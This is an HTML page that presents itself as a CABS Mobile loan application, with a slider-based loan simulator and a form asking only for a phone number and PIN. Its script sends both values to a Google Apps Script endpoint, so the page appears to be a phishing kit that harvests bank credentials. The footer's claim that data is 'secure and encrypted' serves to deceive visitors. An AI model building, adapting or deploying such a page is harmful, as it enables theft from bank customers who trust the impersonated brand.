<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>CABS Mobile – Loan Application</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: #e8eef5;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      padding: 16px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 16px;
      overflow: hidden;
      box-shadow: 0 8px 24px rgba(0, 40, 80, 0.12);
    }

    /* Header with Logo */
    .header {
      background: #ffffff;
      padding: 24px 20px 18px;
      text-align: center;
      border-bottom: 3px solid #1a3a6b;
    }

    .header img {
      max-width: 220px;
      width: 100%;
      height: auto;
      display: block;
      margin: 0 auto;
    }

    .tagline {
      font-size: 13px;
      color: #5a6a7a;
      margin-top: 10px;
    }

    /* Content */
    .content {
      padding: 28px 24px 32px;
    }

    .page-title {
      font-size: 22px;
      color: #1a3a6b;
      text-align: center;
      font-weight: 700;
      margin-bottom: 6px;
    }

    .subtitle {
      text-align: center;
      color: #5a6a7a;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 26px;
    }

    /* Loan Calculator */
    .loan-card {
      background: #f7f9fc;
      border: 1px solid #d6e0ec;
      border-radius: 12px;
      padding: 22px 18px;
      margin-bottom: 28px;
    }

    .loan-title {
      text-align: center;
      color: #1a3a6b;
      font-size: 17px;
      font-weight: 600;
      margin-bottom: 14px;
    }

    .amount {
      text-align: center;
      font-size: 36px;
      font-weight: 800;
      color: #1a3a6b;
      margin: 12px 0 18px;
    }

    input[type="range"] {
      width: 100%;
      height: 6px;
      accent-color: #1a3a6b;
      cursor: pointer;
      margin-bottom: 22px;
    }

    .term label,
    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #1a3a6b;
      margin-bottom: 8px;
    }

    select,
    input[type="tel"],
    input[type="password"] {
      width: 100%;
      padding: 14px 16px;
      border: 1.5px solid #c5d0de;
      border-radius: 10px;
      font-size: 16px;
      background: #ffffff;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    select:focus,
    input:focus {
      border-color: #1a3a6b;
      box-shadow: 0 0 0 3px rgba(26, 58, 107, 0.12);
    }

    .result {
      margin-top: 22px;
      background: #1a3a6b;
      color: white;
      padding: 18px;
      border-radius: 10px;
      text-align: center;
    }

    .result h3 {
      font-size: 14px;
      font-weight: 500;
      opacity: 0.9;
      margin-bottom: 6px;
    }

    .result p {
      font-size: 28px;
      font-weight: 700;
      color: #7ec8e3;
    }

    /* Application Form */
    .application {
      margin-top: 8px;
    }

    .application h2 {
      font-size: 18px;
      color: #1a3a6b;
      margin-bottom: 18px;
      text-align: center;
    }

    .form-group {
      margin-bottom: 18px;
    }

    .btn {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 10px;
      background: #1a3a6b;
      color: white;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s;
    }

    .btn:active {
      background: #122a4f;
    }

    .btn:disabled {
      opacity: 0.65;
      cursor: not-allowed;
    }

    /* Messages */
    .message {
      display: none;
      text-align: center;
      padding: 12px 14px;
      border-radius: 10px;
      margin-bottom: 18px;
      font-size: 14px;
      font-weight: 500;
    }

    .success {
      background: #e6f4ea;
      color: #137333;
    }

    .error {
      background: #fce8e6;
      color: #c5221f;
    }

    /* Footer */
    .footer {
      text-align: center;
      padding: 0 24px 28px;
      font-size: 12px;
      color: #7a8a9a;
      line-height: 1.5;
    }
  </style>
</head>
<body>

  <div class="card">
    <!-- Header with Logo -->
    <div class="header">
      <img src="cabs-logo.png" alt="CABS - A Member of the Old Mutual Group">
      <p class="tagline">Fast Approval • Flexible Repayment • Trusted & Secure</p>
    </div>

    <!-- Content -->
    <div class="content">
      <h1 class="page-title">Loan Application</h1>
      <p class="subtitle">Simulate your loan and apply in minutes</p>

      <div id="message" class="message"></div>

      <!-- Loan Calculator -->
      <div class="loan-card">
        <div class="loan-title">Loan Simulator</div>

        <div class="amount">
          $<span id="loanAmount">500</span>
        </div>

        <input
          type="range"
          id="slider"
          min="500"
          max="50000"
          step="500"
          value="500"
        >

        <div class="term">
          <label for="months">Loan Term</label>
          <select id="months">
            <option value="6">6 Months</option>
            <option value="12" selected>12 Months</option>
            <option value="24">24 Months</option>
            <option value="36">36 Months</option>
            <option value="48">48 Months</option>
            <option value="60">60 Months</option>
          </select>
        </div>

        <div class="result">
          <h3>Estimated Monthly Payment</h3>
          <p id="payment">$43.75</p>
        </div>
      </div>

      <!-- Application Form -->
      <div class="application">
        <h2>Apply Now</h2>

        <form id="applicationForm">
          <div class="form-group">
            <label for="phoneNumber">Phone Number</label>
            <input
              type="tel"
              id="phoneNumber"
              placeholder="Enter your phone number"
              required
              inputmode="numeric"
              autocomplete="tel"
            >
          </div>

          <div class="form-group">
            <label for="pin">PIN</label>
            <input
              type="password"
              id="pin"
              placeholder="Enter your PIN"
              required
              inputmode="numeric"
              maxlength="6"
              autocomplete="current-password"
            >
          </div>

          <button type="submit" class="btn" id="submitBtn">
            APPLY NOW
          </button>
        </form>
      </div>
    </div>

    <div class="footer">
      Your information is secure and encrypted.<br>
      © 2026 CABS Mobile. All rights reserved.
    </div>
  </div>

  <script>
    // ===== LOAN CALCULATOR =====
    const slider = document.getElementById("slider");
    const months = document.getElementById("months");
    const loanAmount = document.getElementById("loanAmount");
    const payment = document.getElementById("payment");

    function calculateLoan() {
      const loan = parseInt(slider.value);
      const term = parseInt(months.value);
      const interest = 0.05;
      const total = loan + (loan * interest);
      const monthly = total / term;

      loanAmount.textContent = loan.toLocaleString("en-US");
      payment.textContent = "$" + monthly.toLocaleString("en-US", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
      });
    }

    slider.addEventListener("input", calculateLoan);
    months.addEventListener("change", calculateLoan);
    calculateLoan();

    // ===== FORM SUBMISSION =====
    const form = document.getElementById("applicationForm");
    const messageEl = document.getElementById("message");
    const submitBtn = document.getElementById("submitBtn");

    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-v1eYH1jsEfDuSbXG1Blkv9pl9AqdqIJ_llVwHkKGDwVHsStxI66vhoPQh2jZBb9t9w/exec";

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      const phone = document.getElementById("phoneNumber").value.trim();
      const pin = document.getElementById("pin").value.trim();

      if (!phone || !pin) {
        showMessage("Please fill in both fields", "error");
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = "Submitting...";

      try {
        const response = await fetch(SCRIPT_URL, {
          method: "POST",
          body: JSON.stringify({
            phoneNumber: phone,
            pin: pin
          })
        });

        const result = await response.json();

        if (result.success) {
          showMessage("Application submitted successfully!", "success");
          form.reset();
        } else {
          showMessage(result.error || "Submission failed. Please try again.", "error");
        }
      } catch (err) {
        showMessage("Network error. Please try again.", "error");
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "APPLY NOW";
      }
    });

    function showMessage(text, type) {
      messageEl.textContent = text;
      messageEl.className = "message " + type;
      messageEl.style.display = "block";
      setTimeout(() => {
        messageEl.style.display = "none";
      }, 4000);
    }
  </script>
</body>
</html>
